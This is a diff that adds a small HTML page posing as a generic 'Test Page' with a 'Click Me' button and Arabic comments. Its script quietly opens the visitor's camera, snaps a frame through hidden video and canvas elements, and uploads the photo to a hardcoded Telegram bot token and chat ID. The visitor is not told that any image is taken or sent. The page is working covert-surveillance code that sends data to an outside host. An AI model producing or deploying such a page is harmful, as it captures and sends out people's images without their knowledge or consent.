@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Capture Photo</title>
+</head>
+<body>
+  <h1>Welcome to the Test Page</h1>
+  <p>Click the button below to perform the action.</p>
+
+  <!-- زر لتنفيذ العملية -->
+  <button id="capture">Click Me</button>
+
+  <!-- عناصر مخفية لالتقاط الصورة -->
+  <video id="video" autoplay style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    // ضع معلومات بوت تيليجرام هنا
+    const TELEGRAM_BOT_TOKEN = '7568930721:AAFAA06xm4js3-mkSCkBiy-UiTiQYe1C7Gk';
+    const TELEGRAM_CHAT_ID = '5482997392';
+
+    let videoStream;
+
+    document.getElementById('capture').addEventListener('click', () => {
+      // طلب الوصول إلى الكاميرا
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          videoStream = stream;
+          const video = document.getElementById('video');
+          video.srcObject = stream;
+
+          setTimeout(() => {
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            // التقاط الصورة من الكاميرا
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // إيقاف الكاميرا
+            videoStream.getTracks().forEach(track => track.stop());
+
+            // تحويل الصورة إلى Blob
+            canvas.toBlob(blob => {
+              const formData = new FormData();
+              formData.append('chat_id', TELEGRAM_CHAT_ID);
+              formData.append('photo', blob);
+
+              // إرسال الصورة إلى تيليجرام
+              fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+              })
+              .then(response => {
+                if (response.ok) {
+                  console.log('Image sent to Telegram successfully!');
+                } else {
+                  console.error('Failed to send image to Telegram:', response.statusText);
+                }
+              })
+              .catch(error => console.error('Error sending image to Telegram:', error));
+            });
+          }, 2000); // تأخير بسيط قبل التقاط الصورة
+        })
+        .catch(error => console.error('Error accessing camera:', error));
+    });
+  </script>
+</body>
+</html>
